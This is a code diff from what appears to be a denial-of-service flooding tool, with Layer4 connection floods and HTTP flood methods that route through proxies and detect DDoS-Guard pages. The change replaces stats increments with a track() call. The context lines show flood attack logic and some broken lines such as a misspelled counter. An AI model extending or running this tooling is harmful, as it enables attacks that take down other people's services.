@@ -100,7 +100,7 @@ google_agents = [
 
 class Tools:
     @staticmethod
-    def humanbits(i: int):
+    def humanbits(i: int) -> str:
         MULTIPLES = ["Bit", "kBit", "MBit", "GBit"]
         if i > 0:
             base = 1024
@@ -141,14 +141,14 @@ class Tools:
     def send(sock: socket, packet: bytes, stats: Stats):
         if not sock.send(packet):
             return False
-        stats += (1, len(packet))
+        stats.track(1, len(packet))
         return True
 
     @staticmethod
     def sendto(sock, packet, target, stats: Stats):
         if not sock.sendto(packet, target):
             return False
-        stats += (1, len(packet))
+        stats.track(1, len(packet))
         return True
 
     @staticmethod
@@ -388,7 +388,7 @@ class Layer4:
     def CPS(self) -> None:
         s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            self._stats += (1, 0)
+            self._stats.track(1, 0)
         Tools.safe_close(s)
 
     def alive_connection(self) -> None:
@@ -401,7 +401,7 @@ class Layer4:
     def CONNECTION(self) -> None:
         with suppress(Exception):
             Thread(target=self.alive_connection).start()
-            self._stats += (1, 0)
+            self._stats.track(1, 0)
 
     def UDP(self) -> int:
         s, packets = None
@@ -808,11 +808,11 @@ class HttpFlood:
                 if pro:
                     with s.get(self._target.human_repr(),
                                proxies=pro.asRequest()) as res:
-                        self._stats += (1, Tools.sizeOfRequest(res))
+                        self._stats.track(1, Tools.sizeOfRequest(res))
                         continue
 
                 with s.get(self._target.human_repr()) as res:
-                    self._stats += (1, Tools.sizeOfRequest(res))
+                    self._stats.track(1, Tools.sizeOfRequest(res))
         Tools.safe_close(s)
 
     def CFBUAM(self) -> int:
@@ -858,7 +858,7 @@ class HttpFlood:
                                 proxies=pro.asRequest()) as res:
                         if b'<title>DDOS-GUARD</title>' in res.content[:100]:
                             break
-                        self._stats += (1, Tools.sizeOfRequest(res))
+                        self._stats.track(1, Tools.sizeOfRequest(res))
 
             Tools.safe_close(ss)
 
@@ -906,12 +906,12 @@ class HttpFlood:
                 if pro:
                     with s.get(self._target.human_repr(),
                                proxies=pro.asRequest()) as res:
-                        self._stats += (1, Tools.sizeOfRequest(res))
+                        self._stats.track(1, Tools.sizeOfRequest(res))
                         packets += 1
                         continue
 
                 with s.get(self._target.human_repr()) as res:
-                    self._stats += (1, Tools.sizeOfRequest(res))
+                    self._stats.track(1, Tools.sizeOfRequest(res))
                     packes += 1
         Tools.safe_close(s)
         return packets
